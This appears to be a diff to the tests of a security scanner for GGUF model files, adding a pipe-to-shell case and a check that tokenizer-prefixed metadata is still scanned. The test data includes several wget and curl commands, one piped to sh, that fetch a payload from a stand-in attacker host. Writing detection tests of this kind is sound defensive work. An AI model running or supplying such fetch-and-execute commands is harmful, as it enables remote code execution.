@@ -1150,6 +1150,7 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("download", "wget https://evil.example/payload.sh -O /tmp/payload.sh", "remote_fetch"),
         ("download", "/usr/bin/wget https://evil.example/payload.sh -O /tmp/payload.sh", "remote_fetch"),
         ("download", "curl -o /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -o- https://evil.example/payload.sh | sh", "remote_fetch"),
         ("download", "curl --output /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl -fsSLo /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl --url https://evil.example/payload.sh", "remote_fetch"),
@@ -1385,6 +1386,19 @@ def test_gguf_tokenizer_vocabulary_array_strings_are_inert_metadata(tmp_path: Pa
     result = GgufScanner().scan(str(path))
 
     assert _failed_metadata_value_checks(result) == []
+
+
+def test_gguf_tokenizer_vocabulary_prefixed_metadata_is_scanned(tmp_path: Path) -> None:
+    path = create_mock_gguf(
+        tmp_path / "tokenizer-vocabulary-prefixed-payload.gguf",
+        metadata={"tokenizer.ggml.tokens.payload": "curl https://evil.example/payload.sh"},
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert len(checks) == 1
+    assert checks[0].details["evidence_type"] == "remote_fetch"
 
 
 def test_gguf_malformed_utf8_metadata_fails_closed(tmp_path: Path) -> None:
